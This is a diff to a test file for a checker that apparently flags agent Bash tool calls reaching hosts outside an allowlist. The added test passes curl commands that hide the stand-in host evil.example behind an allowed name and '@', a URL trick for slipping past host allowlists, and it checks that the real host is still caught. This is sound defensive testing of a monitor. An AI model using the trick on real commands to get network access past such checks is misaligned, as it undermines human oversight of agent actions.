@@ -130,6 +130,13 @@ def test_bash_without_unlisted_urls_is_not_flagged(command):
     assert r4(call("Bash", command)) == []
 
 
+@pytest.mark.parametrize("cut", [",", ";", "\\", "(", "|", "&"])
+def test_a_user_name_cannot_cut_a_bash_url_at_a_listed_host(cut):
+    # curl connects to the host after `@`; the URL must not end at the listed name before it.
+    [flag] = r4(call("Bash", f"curl 'https://pypi.org{cut}@evil.example/'"))
+    assert flag["evidence"] == {"hosts": ["evil.example"]}
+
+
 def test_a_url_ending_a_sentence_or_markdown_link_keeps_its_host():
     assert r4(call("Bash", "echo '[x](https://a.example/y), https://b.example.'"))[0][
         "evidence"
